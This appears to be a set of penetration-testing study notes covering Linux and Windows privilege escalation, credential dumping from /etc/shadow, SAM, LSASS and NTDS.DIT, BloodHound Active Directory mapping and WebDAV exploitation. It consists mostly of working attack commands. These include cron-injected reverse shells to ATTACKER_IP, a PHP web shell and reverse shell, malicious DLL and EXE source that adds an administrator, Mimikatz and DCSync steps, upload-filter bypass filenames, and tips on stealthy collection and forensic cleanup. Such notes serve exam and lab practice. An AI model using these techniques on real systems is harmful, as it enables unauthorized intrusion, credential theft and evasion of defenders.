  • AD Security - Kerberos Attacks

  • Harmj0y’s Kerberos Notes

  • BloodHound for Account Targeting

docs.title: Linux PE
docs.text: Start Here: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

docs.title: References
docs.text:
• GTFOBins: Privilege Escalation
  • Exploit-DB
  • Linux Privilege Escalation

Tip

grep -r "password" /etc /home /var/www 2>/dev/null catches a surprising number of credentials in config files. Also check .bash_history, .bashrc, .profile, and /var/log/ for command history with embedded credentials.

docs.title: Extracting User Information from /etc/passwd
docs.text: The /etc/passwd file contains information about system users, including their home directories and assigned shells. It is world-readable, allowing attackers to enumerate local users.

docs.title: Listing System Users
docs.text:
cat /etc/passwd

Example output:

root:x:0:0:root:/root:/bin/bash
john:x:1001:1001:John Doe:/home/john:/bin/bash

If a user entry contains a password hash instead of x, it may indicate a system with outdated authentication configurations.

docs.title: Extracting Password Hashes from /etc/shadow
docs.text: The /etc/shadow file contains encrypted password hashes and is only accessible by root.

docs.title: Checking Permissions
docs.text:
ls -lah /etc/shadow

If the file is world-readable, password hashes can be extracted directly:

cat /etc/shadow

Example output:

root:$6$abc123$K1VZVuJx0UwK1yR3c7z4J0:18701:0:99999:7:::
john:$6$def456$L7MqNZa27N8nYgU1/MU8:18701:0:99999:7:::

These hashes can be cracked using hashcat or John the Ripper.

docs.title: Extracting Hashes Using Readable shadow Backups
docs.text:
If a backup of /etc/shadow exists and is world-readable, it can be exploited:

find / -name "shadow*" -type f -readable 2>/dev/null

Extract hashes for offline cracking:

cat /var/backups/shadow.bak

Transfer the file and crack it using:

john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak

or

hashcat -m 1800 shadow.bak /usr/share/wordlists/rockyou.txt

This allows retrieval of plaintext passwords from stored hashes.

docs.title: Hunting for SSH Private Keys
docs.text: SSH keys are commonly used for authentication and, if improperly secured, can be leveraged to gain unauthorized access.

docs.title: Searching for Private Keys
docs.text:
find / -name "id_rsa" -type f 2>/dev/null

or

find /home -name "*.pem" -o -name "*.ppk" 2>/dev/null

If a private key is found, check its permissions:

ls -lah ~/.ssh/id_rsa

If readable, it can be used to log in to remote machines.

docs.title: Extracting Passphrases from Encrypted SSH Keys
docs.text:
If the private key is encrypted, extract the passphrase hash:

ssh2john id_rsa > ssh.hash

Crack the passphrase with john:

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

Once cracked, use the decrypted key:

ssh -i id_rsa user@target

This grants access to the remote system using the compromised credentials.

docs.title: Searching for Passwords in Configuration Files
Check for "password" recursively
docs.text: grep -iR --color=always 'password' .

docs.title: Searching for Passwords in Files
docs.text:
grep -r "password" /etc/
find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.json" \) -exec grep -i "password" {} + 2>/dev/null

docs.title: Exploiting id_rsa for Lateral Movement
docs.text: If an SSH key is obtained, attempt authentication across other systems.

docs.title: Using SSH Key for Remote Access
docs.text:
ssh -i id_rsa user@target

If SSH agent forwarding is enabled, escalate access:

ssh -A user@intermediate
ssh user@target

This allows pivoting through compromised systems using agent-forwarded credentials.

docs.title: References
docs.text:
• GTFOBins: SUID Exploits
  • Exploit-DB: Linux Privilege Escalation

Tip

For SUID binaries, check GTFOBins first before writing custom exploits — most common binaries have documented privesc paths. For cron, check if the script is writable OR if any directory in its path is writable (path injection).

Watch out

SUID on custom binaries (not standard Linux utils) is a red flag — these are often intentional CTF vectors. In real engagements, SUID on non-standard binaries can indicate misconfiguration worth investigating.

docs.title: Exploiting Vulnerable Cron Jobs
docs.text: Cron jobs run scheduled tasks and, if misconfigured, can allow privilege escalation.

docs.title: Identifying Misconfigured Cron Jobs
docs.text:
To check system cron jobs:

cat /etc/crontab
ls -lah /etc/cron.*

Check for writable cron job scripts:

find /etc/cron* -writable -type f 2>/dev/null

If a cron job script is writable by an unprivileged user and executed as root, it can be modified to run arbitrary commands.

docs.title: Exploiting Writable Cron Job Scripts
docs.text:
1. Confirm write access:

    ls -lah /home/joe/.scripts/user_backups.sh

  2. Inject a reverse shell:

    echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /home/joe/.scripts/user_backups.sh

  3. Start a Netcat listener:

    nc -lvnp 4444

  4. Wait for the cron job to execute and provide a root shell.

docs.title: Exploiting SUID and GUID Binaries
docs.text: SUID binaries execute with the owner's privileges, and GUID binaries execute with the group owner's privileges. If these binaries are misconfigured, they can be abused for privilege escalation.

docs.title: Identifying SUID and GUID Binaries
docs.text:
find / -perm -4000 -type f 2>/dev/null       # Find SUID binaries
find / -perm -u=s -o -perm -g=s 2>/dev/null  # Check SUID binaries
find / -writable -type d 2>/dev/null         # Find writable directories

docs.title: Exploiting SUID Binaries
docs.text:
If find has the SUID bit set:

find . -exec /bin/sh -p \; -quit

If python has the SUID bit set:

python -c 'import os; os.setuid(0); os.system("/bin/sh")'

These commands escalate privileges by executing a new shell as root.

docs.title: Exploiting SUID via Overwriting Sensitive Files
docs.text:
If cp or tar has the SUID bit set, they can be used to overwrite system files:

  1. Copy /etc/shadow to /tmp:

    cp /etc/shadow /tmp/shadow.bak

  2. Modify /etc/shadow with a new root password:

    openssl passwd -1 -salt xyz P@ssw0rd

  3. Replace /etc/shadow with the modified file:

    cp /tmp/shadow.bak /etc/shadow

  4. Switch to root:

    su root

This method grants root access by modifying stored credentials.

docs.title: References
docs.text:
• Exploit-DB

  • GTFOBins

  • Linux Kernel Exploits GitHub

  • Linux Exploit Suggester

Watch out

Kernel exploits are a last resort — they can crash the system and are noisy. Always exhaust sudo, SUID, cron, and credential hunting before attempting kernel exploitation.

Tip

Use linux-exploit-suggester or linpeas to identify candidate exploits for the kernel version. Cross-reference with searchsploit to find a compiled PoC before attempting to build from source.

docs.title: Identifying Kernel Vulnerabilities
docs.text: Kernel exploits target vulnerabilities in the Linux kernel to escalate privileges. First, gather system information to check for potential exploits.

docs.title: Checking Kernel Version
docs.text:
uname -r
cat /proc/version
lsb_release -a

Example output:

4.4.0-116-generic

Cross-reference this kernel version with known privilege escalation exploits using searchsploit:

searchsploit "linux kernel 4.4.0"

Filter results for local privilege escalation vulnerabilities:

searchsploit "linux kernel 4.4 Local Privilege Escalation" | grep -v " < 4.4.0" | grep -v "4.8"

If an exploit exists, download and compile it.

docs.title: Compiling and Executing a Kernel Exploit
docs.text:
1. Transfer the exploit to the target machine.

  2. Compile the exploit:

    gcc exploit.c -o exploit -pthread

  3. Execute the exploit:

    ./exploit

If successful, a root shell will be obtained.

docs.title: Polkit Privilege Escalation (CVE-2021-4034)
docs.text: pkexec is a Polkit binary that allows privilege escalation when exploited.

docs.title: Identifying the Vulnerable Version
docs.text:
/usr/bin/pkexec --version

Example output:

0.105

If vulnerable, download the exploit:

git clone https://github.com/mebeim/CVE-2021-4034

Transfer the exploit to the target:

scp expl.sh fake_module.c helper.c user@target:/tmp

Execute the exploit:

cd /tmp
chmod +x expl.sh
./expl.sh

If successful, a root shell will be obtained.

docs.title: Overwriting /etc/passwd
docs.text: If /etc/passwd is writable, a new root user can be created.

docs.title: Checking File Permissions
docs.text:
ls -lah /etc/passwd

If writable, generate a new password hash:

openssl passwd -1 -salt xyz P@ssw0rd

Append the new user to /etc/passwd:

echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd

Switch to the new root user:

su root2

This grants root access without needing an exploit.

docs.title: References
docs.text:
• GTFOBins: SUID Exploits
  • Linux Exploit Suggester

Quick win order

  1. sudo -l — misconfigured sudo is the most common Linux privesc
  2. SUID binaries: find / -perm -4000 2>/dev/null — check against GTFOBins
  3. Writable cron jobs: cat /etc/cron* /etc/cron.d/* and check script permissions
  4. Running as a service account? Check what the service binary does and if it's writable
  5. Check /etc/passwd for writable entries
  6. Kernel version: uname -r — only exploit if nothing else works, kernel exploits are noisy

docs.title: Host Enumeration
docs.text: Identifying users on a compromised system helps locate privileged accounts or misconfigurations.

docs.title: Basic Information
docs.text:
whoami && id                 # Current user & groups
hostname && uname -a         # Hostname & system info
cat /etc/issue               # OS version
cat /etc/passwd              # User list
cat /etc/shadow              # If readable, privilege escalation possible
cat /etc/os-release          # OS release
dpkg -l                      # List all installed packages

docs.title: Check for Active Sessions
docs.text:
w
who
last

These commands reveal currently logged-in users, their activity, and recent logins.

docs.title: Cron Job Enumeration
docs.text: Cron jobs execute scheduled tasks, and misconfigurations can allow privilege escalation.

docs.title: List Current User's Cron Jobs
docs.text: crontab -l

docs.title: List System-Wide Cron Jobs
docs.text:
cat /etc/crontab
ls -lah /etc/cron*

If a root cron job executes a writable script, an attacker can modify it to execute a malicious payload.

docs.title: Finding Cron Jobs in Logs
docs.text:
grep "CRON" /var/log/syslog

This shows cron job execution history, useful for identifying recurring privileged tasks.

docs.title: Exploiting a Writable Cron Job
docs.text:
If a writable script is executed as root:

echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/script.sh

Then start a Netcat listener:

nc -lvnp 4444

The payload executes on the next cron job run, providing a reverse shell.

docs.title: Finding Writable Files and Directories
docs.text:
find / -writable -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

Note: Use the strings command to extract any readable text or strings from listed binary files.

Example: 

strings /usr/bin/passwd

docs.title: Checking SUID and GUID Binaries
docs.text:
SUID binaries execute with the owner's privileges:

find / -perm -4000 -type f 2>/dev/null

GUID binaries execute with the group owner's privileges:

find / -perm -2000 -type f 2>/dev/null

These binaries can be exploited to gain elevated privileges.

docs.title: Check for "password" recursively:
docs.text: grep -iR --color=always 'password' .

docs.title: Checking for Stored Credentials
docs.text:
grep -r "password" /etc/
find / -name "*.conf" -exec grep -i password {} \; 2>/dev/null

These commands locate configuration files containing plaintext credentials.

docs.title: Checking for World-Readable Shadow Files
docs.text:
ls -l /etc/shadow

If readable by an unprivileged user, hashes can be extracted for cracking.

docs.title: Owned by root
docs.text: ps aux | grep root

docs.title: Local Services
docs.text:
netstat -ano        # Network connections & Listening ports
ps aux              # List all system processes
ss -anp             # System processes

docs.title: List all drives that will be mounted at boot time
docs.text: cat /etc/fstab

docs.title: List all mounted filesystems
docs.text: mount

docs.title: View all available disks
docs.text: lsblk

docs.title: Writing to /etc/passwd
docs.text:
First, generate a hash for the password, w00t in this case: 

openssl passwd w00t

Next, place this into the /etc/passwd file: 

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

Finally, switch users to root2 and use the new credentials root2:w00t: 

su root2

docs.title: Abusing Sudo
docs.text:
List all allowed sudo commands for the current user: 

sudo -l


joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get

The above shows the current user has sudo privileges to crontab, tcpdumb, and apt-get

Use GTFOBins to look for PE pathways if sudo can be performed by the user.

docs.title: Windows PE
docs.text: Start Here: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

docs.title: References
docs.text:
• Mimikatz GitHub
  • Impacket - secretsdump.py

Tip

If you have local admin but LSASS is protected, dump SAM/SYSTEM offline: reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak then impacket-secretsdump -sam sam.bak -system system.bak LOCAL.

Watch out

LSASS dumps trigger EDR on most enterprise endpoints. Check for AV/EDR first with tasklist — look for CrowdStrike, SentinelOne, Defender, Carbon Black processes.

docs.title: Dumping Credentials from the Security Account Manager (SAM)
docs.text: The Security Account Manager (SAM) database contains NTLM password hashes for local user accounts. However, direct access is restricted while the system is running.

docs.title: Extracting SAM and SYSTEM Files
docs.text:
If SeBackupPrivilege is enabled, the SAM and SYSTEM hives can be dumped:

reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system

Once transferred to the attacker's machine, extract NTLM hashes:

pypykatz registry --sam sam system

This will extract NTLM hashes for all local user accounts.

docs.title: Dumping Credentials from LSASS
docs.text: The Local Security Authority Subsystem Service (LSASS) manages Windows authentication and stores credential material, including NTLM and Kerberos tickets.

docs.title: Extracting Credentials with Mimikatz
docs.text:
1. Run PowerShell as Administrator.

  2. Launch Mimikatz:

    .\mimikatz.exe

  3. Enable debugging privileges:

    privilege::debug

  4. Dump credentials:

    sekurlsa::logonpasswords

This will list cached credentials, including plaintext passwords if available.

docs.title: Extracting LSASS Dump for Offline Analysis
docs.text:
If Mimikatz is detected, an LSASS dump can be taken for offline extraction:

tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe comsvcs.dll, MiniDump 1234 C:\Temp\lsass.dmp full

Copy lsass.dmp to the attacker machine and extract credentials:

pypykatz lsa minidump lsass.dmp

This will parse credential material from the LSASS memory dump.

docs.title: Dumping NTDS.DIT for Domain Credentials
docs.text:
The ntds.dit file is the Active Directory database on a Domain Controller. It contains hashed passwords and all domain objects (users, groups, computers). To decrypt the password hashes stored inside ntds.dit, you also need the Windows registry hive SYSTEM, which contains the BootKey used to decrypt the hashes.

By extracting both files and using Impacket’s secretsdump.py, it is possible to dump all domain password hashes offline, without live interaction with the Domain Controller.

docs.title: Extracting NTDS.DIT via Shadow Copies
docs.text:
1. Create a shadow copy:

    vssadmin create shadow /for=C:

  2. Identify the shadow copy path:

    vssadmin list shadows

  3. Copy ntds.dit:

    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\Temp\ntds.dit

  4. Extract the SYSTEM hive:

    reg save hklm\system C:\Temp\system

docs.title: Extracting NTDS.DIT via File System Copy
docs.text:
1. Use nxc smb or powershell to copy: 

    copy C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

  2. Transfer files to your local machine 

    nxc smb <target> -u user -p pass --exec "get \\C$\Temp\ntds.dit ./ntds.dit"
nxc smb <target> -u user -p pass --exec "get \\C$\Temp\SYSTEM ./SYSTEM"

docs.title: Extracting the Hash via secretsdump
docs.text:
Once the ntds.dit and system files have been transferred to your local machine, we can run secretsdump to extract credentials:

impacket-secretsdump -ntds ntds.dit -system system LOCAL

This retrieves NTLM hashes for all domain users.

docs.title: DCSync Attack - Dumping Domain Hashes Remotely
docs.text: If an account has Replicating Directory Changes privileges, it can request password hashes from the DC using the DCSync attack.

docs.title: Performing a DCSync Attack with Mimikatz
docs.text:
Run Mimikatz on a domain-joined machine with high privileges:

lsadump::dcsync /domain:corp.com /user:Administrator

This will return NTLM and Kerberos hashes for the target user:

NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

These hashes can be used for Pass-the-Hash attacks.

docs.title: Local Enumeration
docs.text:
Quick win order

  1. whoami /priv — check for SeImpersonatePrivilege (Potato attacks), SeDebugPrivilege
  2. net localgroup administrators — already in admin group?
  3. Unquoted service paths: wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
  4. AlwaysInstallElevated: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  5. Stored credentials: cmdkey /list, check for saved RDP/WinRM credentials
  6. Run winpeas.exe for a comprehensive sweep — cross-reference findings manually

docs.title: PowerShell History
docs.text:
Reveal previously ran commands through PowerShell to identify potential secrets or credentials:

type (Get-PSReadlineOption).HistorySavePath

docs.title: Identifying Logged-On Users
docs.text:
Enumerating logged-on users can reveal potential targets for privilege escalation or lateral movement. One method is using PsLoggedOn.exe:

.\PsLoggedon.exe \\client74

Example output:

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     10/5/2022 1:33:32 AM       CORP\stephanie

This shows that jeffadmin has an open session on client74, indicating a potential credential theft opportunity if admin access is available.

Another approach is using PowerView:

Get-NetSession -ComputerName client74

This retrieves session information, listing who is currently logged in.

docs.title: Registry Enumeration
docs.text:
The registry can store credentials, misconfigurations, and escalation paths. The HKEY_USERS hive contains SIDs for logged-on users, and NetSessionEnum relies on the SrvsvcSessionInfo key to enumerate logged-on sessions:

Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

This command lists access control entries (ACEs) that allow or restrict access to session enumeration.

To manually extract user session data:

reg query "HKEY_USERS"

To check stored credentials:

cmdkey /list

If admin credentials are stored, they may be leveraged for privilege escalation.

docs.title: Service Enumeration
docs.text: Services running as SYSTEM or high-privilege accounts can be exploited if misconfigured.

docs.title: Finding Auto-Start Services
docs.text:
wmic service get name,pathname,startmode | findstr /i "auto"

If any writable services run as SYSTEM, they may be replaced to escalate privileges.

docs.title: Checking Unquoted Service Paths
docs.text:
wmic service get name,pathname | findstr /i /v "c:\windows"

If a service path lacks quotes and contains spaces, it can be hijacked by placing a malicious executable in an intermediate directory.

docs.title: Access Control List (ACL) Enumeration
docs.text:
ACEs define permissions for objects. PowerView can enumerate object permissions:

Get-ObjectAcl -Identity stephanie

Filtering results for full control permissions:

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Converting a SID to a readable name:

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

Results may indicate privilege escalation paths via misconfigured ACLs.

docs.title: Exploiting Writable Services
docs.text:
If a service is writable, reconfigure it to execute a malicious payload:

sc config VulnService binPath= "C:\attacker\malicious.exe"
net start VulnService

This replaces a vulnerable service with an attacker-controlled binary, granting elevated access.

docs.title: References
docs.text:
• Juicy Potato GitHub Repository
  • FoxGlove Security: Rotten Potato Attack
  • Windows Privilege Escalation Guide
  • LOLBAS Project

Tip

SeImpersonatePrivilege is the most common Windows privesc in HTB and real engagements. Use PrintSpoofer, RoguePotato, or GodPotato depending on Windows version. whoami /priv is always the first check.

docs.title: Overview
docs.text: SeImpersonatePrivilege allows a process to impersonate another security context. This is commonly granted to service accounts and can be exploited using various token impersonation techniques.

docs.title: Identifying SeImpersonatePrivilege
docs.text:
Check if the current user has SeImpersonatePrivilege:

whoami /priv | findstr /i "SeImpersonate"

If enabled, privilege escalation can be attempted using token impersonation.

docs.title: Juicy Potato (Windows < 10 1809 / Server 2019)
docs.text:
Juicy Potato exploits COM object activation to escalate privileges to SYSTEM.

  1. Transfer Juicy Potato to the target:

    iwr -uri http://192.168.45.226/JuicyPotato.exe -OutFile JuicyPotato.exe

  2. Execute with an appropriate CLSID:

    JuicyPotato.exe -l 1337 -p cmd.exe -t *

  3. If successful, a new command shell as SYSTEM will be obtained.

docs.title: PrintSpoofer (Windows 10 1809+)
docs.text:
PrintSpoofer exploits the SeImpersonatePrivilege by abusing named pipes:

  1. Transfer PrintSpoofer:

    iwr -uri http://192.168.45.226/PrintSpoofer.exe -OutFile PrintSpoofer.exe

  2. Execute with:

    .\PrintSpoofer.exe -i -c cmd

This should elevate the shell to SYSTEM.

docs.title: Overview
docs.text: SeDebugPrivilege allows a user to debug and modify system processes, including those running as SYSTEM.

docs.title: Identifying SeDebugPrivilege
docs.text:
Check if the current user has SeDebugPrivilege:

whoami /priv | findstr /i "SeDebug"

If enabled, this can be used to dump credentials from LSASS or manipulate privileged processes.

docs.title: Extracting Credentials from LSASS
docs.text:
If SeDebugPrivilege is enabled, Mimikatz can be used to dump credentials.

  1. Transfer Mimikatz:

    iwr -uri http://192.168.45.226/mimikatz.exe -OutFile mimikatz.exe

  2. Run Mimikatz:

    mimikatz.exe

  3. Enable privileges:

    privilege::debug

  4. Dump credentials:

    sekurlsa::logonpasswords

This will extract credentials from memory, including NTLM hashes and plaintext passwords.

docs.title: Creating a SYSTEM Shell
docs.text:
With SeDebugPrivilege, a SYSTEM shell can be obtained by injecting into winlogon.exe:

mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # process::list
mimikatz # process::open winlogon.exe
mimikatz # process::token
mimikatz # process::run

This will spawn a new SYSTEM shell.

docs.title: References
docs.text:
• Windows Privilege Escalation Guide
  • LOLBAS Project
  • Fuzzy Security Guide

Tip

For DLL hijacking: use procmon to find NAME NOT FOUND DLL lookups in writable directories, then drop a malicious DLL. For unquoted paths: verify you can write to one of the path components before spending time crafting the binary.

docs.title: Unquoted Service Paths
docs.text: Unquoted service paths are a common privilege escalation vulnerability when a Windows service’s executable path contains spaces but is not enclosed in quotes. Windows attempts to execute the service by searching for executable files in each segment of the path.

docs.title: Identifying Unquoted Service Paths
docs.text:
To list services with unquoted paths:

wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

or using PowerShell:

Get-CimInstance -ClassName win32_service | Select Name,State,PathName

If a service path contains spaces and lacks quotation marks, Windows may mistakenly execute a malicious binary placed in an intermediate directory.

docs.title: Exploiting Unquoted Service Paths
docs.text:
1. Identify if the service is writable:

    icacls "C:\Program Files\My Program\"

    If the output shows (RX,W), the user has write permissions.

  2. Create a malicious executable:

    #include <stdlib.h>

int main() {
    system("net user attacker P@ssw0rd /add");
    system("net localgroup administrators attacker /add");
    return 0;
}

    Compile the executable:

    x86_64-w64-mingw32-gcc adduser.c -o My.exe

  3. Place My.exe in the vulnerable directory:

    copy .\My.exe "C:\Program Files\My Program\"

  4. Restart the service to trigger execution:

    net stop vulnerable_service
net start vulnerable_service

After execution, check the local administrators group:

net localgroup administrators

The newly created user should be listed.

docs.title: DLL Hijacking
docs.text: DLL hijacking occurs when an application loads a missing or user-writable DLL, allowing an attacker to replace it with a malicious version.

docs.title: Identifying DLL Hijacking Opportunities
docs.text:
1. Use Process Monitor to list missing DLLs:

    • Open Procmon.exe

    • Set a filter for Path contains .dll

    • Look for NAME NOT FOUND results

  2. List all DLLs loaded by a service:

    Get-Process -Id (Get-Service VulnerableService).Id | Select-Object -ExpandProperty Modules

  3. Check permissions of the DLL directory:

    icacls "C:\Program Files\VulnerableApp\"

docs.title: Exploiting DLL Hijacking
docs.text:
1. Write a malicious DLL:

    #include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user attacker P@ssw0rd /add");
        system("net localgroup administrators attacker /add");
    }
    return TRUE;
}

  2. Compile the DLL:

    x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

  3. Place the DLL in the vulnerable path:

    copy .\malicious.dll "C:\Program Files\VulnerableApp\"

  4. Restart the application to execute the DLL:

    net stop VulnerableService
net start VulnerableService

After execution, the new attacker user should appear in the administrators group.

docs.title: Overview
docs.text:
Tip

Know your tool ecosystem: NetExec for credential spraying and lateral movement, Impacket for protocol-level attacks, BloodHound for AD path mapping, Mimikatz for credential dumping. Having all four ready on your attacker machine covers 90% of Windows/AD engagements.

docs.title: BloodHound — Active Directory Attack Path Mapping
References
docs.text:
https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf

Tip

After importing SharpHound data, run these queries immediately: "Shortest Paths to Domain Admins", "Find AS-REP Roastable Users", "Find Kerberoastable Users with Most Privileges". These cover 80% of HTB AD paths.

docs.title: SharpHound Data Collection
docs.text: SharpHound is the official ingestor used to collect Active Directory data for BloodHound. It is executed from a host inside the domain (e.g., compromised Windows system) and will be the first step in setting up BloodHound.

docs.title: Setup (.ps1)
docs.text:
Download the latest release of SharpHound onto kali. Next, start a python server and upload to the target - or use a variety of other methods to upload. 

powershell -ep bypass
Import-Module .\Sharphound.ps1

And now we're ready to run: 

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\taylor\Desktop\ -OutputPrefix "TARGET"

  • Update the -OutputDirectory to the PWD where SharpHound is located
  • Update -OutputPrefix to the target name. This will make the file name as follows: TARGET_sdfsdf.zip

docs.title: Setup (.exe)
docs.text:
Download the latest release of SharpHound onto kali. Next, start a python server and upload to the target - or use a variety of other methods to upload. 

SharpHound.exe -c all,gpolocalgroup

This performs all the following collections:

  • Session: Identifies where users are logged in

  • LocalAdmin: Lists local admin rights

  • Trusts: Maps domain trusts

  • ACL: Dumps access control lists (useful for privilege escalation)

  • ObjectProps: Gathers metadata on domain objects

docs.title: Focused (Stealthier) Collections
docs.text:
SharpHound.exe -c Session,LocalAdmin,ObjectProps

Use this when attempting to stay low-noise in a monitored environment.

docs.title: Output
docs.text: Once SharpHound is completed, a zip file will be created in the specified directory. Download this, or access the network drive, to use on our Windows laptop.

docs.title: Setup using Kali (Preferred)
docs.text:
Note: Kali will only run the older version of BloodHound (can't figure out the docker issue) which requires the older version of SharpHound, or equivalent data collector!

First, run the collection using the appropriate collector:

bloodhound-python -c all,Group,Session,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL -d "nagoya-industries.com" -ns 192.168.177.21 -v -u Andrea.Hayes -p Nagoya2023 --zip

Next, use the following commands to start BloodHound: 

sudo neo4j start 
bloodhound

docs.title: Setup using Docker (Windows)
docs.text:
To begin, we'll be using the Windows host laptop rather than the kali VM due to issues with docker-compose.

First, make sure Docker Desktop is up and running.

Next, CD into the appropriate directory which hosts the docker-compose.yml file: 

cd C:\Users\taylo\docker\BloodHound
curl.exe -L https://ghst.ly/getbhce | docker compose -f - up

During setup, you should see an info message with the phrase below: 

Initial Password Set To: ....

Once the setup is completed, navigate to the following URL: 

http://localhost:8080

Use admin as the username and the password set in setup to log in. Note: The password should only be set during initial update. Check vault for login.

docs.title: Uploading SharpHound Collection (File Ingest)
docs.text:
Begin by navigating to the following URL: 

http://localhost:8080/ui/administration/file-ingest

Next, choose Upload File(s) and select the zip file created from the SharpHound collection section.

docs.title: Analyzing File Ingest - Shortest Path Queries
docs.text:
Below is an extremely useful example of how to query the collection data. BloodHound will find the shortest path to a specific destination, for example DA. This will reveal privileges to user accounts, for computers in the domain, and much more.

![[Pasted image 20250404154133.png]]

docs.title: Common Abuse Paths Mapped by BloodHound
docs.text: Technique Description Tools to Use ACL Abuse Exploit GenericWrite/All permissions on users/groups PowerView, SharpHound GPO Abuse Edit group policy on target OUs Gptpwnt.py Kerberoasting Request and crack SPNs to recover service account creds Rubeus, Impacket AS-REP Roasting Crack accounts without preauth GetNPUsers.py Constrained Delegation Abuse s4u2proxy for impersonation Rubeus, Impacket Unconstrained Delegation Steal TGT from LSASS on a machine with unconstrained del Rubeus, Mimikatz Shadow Credentials Add altSecurityIdentities attribute Whisker Resource-Based Constrained Delegation Abuse msDS-AllowedToActOnBehalfOfOtherIdentity Impacket, PowerView

docs.title: Practical BloodHound Usage Tips
docs.text:
• Run BloodHound collection immediately after first internal access to avoid manual recon.

  • Use focused collection flags to minimize detection on monitored networks.

  • Combine BloodHound output with tools like NetExec and Rubeus to execute the full attack path.

  • Export query results for audit trails or reporting.

  • Clean up SharpHound.exe and the zip output from disk post-collection to minimize forensic evidence.

Example cleanup:

nxc smb <target_ip> -u <user> -p <pass> --exec "del C:\Temp\SharpHound.exe"
nxc smb <target_ip> -u <user> -p <pass> --exec "del C:\Temp\data.zip"

docs.title: Summary: Post-Access BloodHound Workflow
docs.text:
1. Compromise a host inside the domain

  2. Upload and run SharpHound for collection

  3. Exfiltrate the data

  4. Load it into BloodHound and analyze attack paths

  5. Identify shortest paths to Domain Admin or privileged access

  6. Execute lateral movement or escalation using NetExec, Rubeus, or Impacket

  7. Clean up all binaries and collection artifacts

docs.title: Cadaver – WebDAV Client Tool
docs.text:
Tip

cadaver http://<target>/webdav/ opens an interactive FTP-like session. Use put shell.php to upload, ls to list. If the server is IIS, upload .asp or .aspx instead of .php.

docs.title: Syntax
docs.text:
cadaver http://$IP/path/
Note: /path may not be necessary depending where the WebDAV server is installed.

If authentication is required, cadaver will prompt for username and password:

cadaver http://$IP/
Authentication required for webdav on server `target-ip':
Username: test
Password: ****

For HTTPS with a self-signed cert:

cadaver https://$IP/

To skip SSL verification:

GIT_SSL_NO_VERIFY=1 cadaver https://$IP/

docs.title: Useful Cadaver Commands
docs.text:
Once connected:

Command Description ls List directory contents cd <dir> Change directory get <file> Download a file put <file> Upload a file mget <files> Download multiple files mput <files> Upload multiple files delete <file> Delete a file mkdir <dir> Create directory rmdir <dir> Remove directory exit Close the session

docs.title: Upload a Reverse Shell
docs.text:
First, let's upload a web shell. Refer to the section below for PHP while this will cover IIS (.aspx): 

put /usr/share/webshells/aspx/cmdasp.aspx

Create a payload: 

msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe > revshell.exe

Navigate to the site to interact with our cmdasp.aspx page: 

http://$IP/cmdasp.aspx

Find out where our shell is stored using the cmdasp.aspx command box: 

dir -s c:\

Once you locate revshell.exe, start a reverse shell and enter the path, followed by the payload name to execute from the cmdasp.aspx page: 

c:\inetpub\wwwroot\revshell.exe
![[Pasted image 20250410135833.png]]

Reference: [[Hutch#WebDAV]]

docs.title: Upload a Basic Web Shell
docs.text:
Assuming target is a PHP-enabled WebDAV server:

put shell.php

Basic PHP reverse shell example:

<?php system($_GET['cmd']); ?>

Then access in browser:

http://$IP/shell.php?cmd=whoami

docs.title: Upload with Filename Bypass (if extensions blocked)
docs.text:
Try:

put shell.pHp
put shell.ph%00p
put shell.php;.txt

Test access and see if the shell is interpreted.

docs.title: Exploitation Workflow
docs.text:
1. Identify WebDAV Support

    nmap -n -sV --script http-iis-webdav-vuln.nse $IP
curl -X OPTIONS http://$IP/

    Look for DAV: 1,2 in response headers.

  2. Connect to the WebDAV Directory

    cadaver http://$IP/

  3. Check Write Permissions

    ls
mkdir testdir
put testfile.txt

  4. Upload Web Shell

    put shell.php

  5. Execute Shell

    curl http://$IP$IP/shell.php?cmd=id

  6. Establish Reverse Shell (if possible) Payload:

    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>

docs.title: Misconfigurations to Look For
docs.text:
• Anonymous WebDAV write access (no auth required).

